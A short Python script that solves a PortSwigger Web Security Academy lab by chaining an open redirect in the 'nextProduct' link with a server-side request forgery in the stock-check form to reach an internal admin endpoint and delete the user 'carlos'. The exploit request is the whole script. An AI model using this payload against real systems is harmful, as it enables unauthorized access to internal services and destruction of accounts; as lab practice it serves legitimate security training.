#https://portswigger.net/web-security/learning-paths/ssrf-attacks/ssrf-attacks-circumventing-defenses/ssrf/lab-ssrf-filter-bypass-via-open-redirection#
URL = "https://0aa1002e04ccb58680d8f8e0008200b7.web-security-academy.net"
import requests
client = requests.sessions.Session()
stock_url = URL + "/product/stock"
r = client.get(url=URL)
#print(r.text)
data ={
    'stockApi':'/product/nextProduct?currentProductId=2&path=http://192.168.0.12:8080/admin/delete?username=carlos'
} #use open redirect vulnerability discovered by checking the next product button.
r = client.post(url=stock_url, data=data, allow_redirects=False)
print(r.status_code)
#print(r.text)




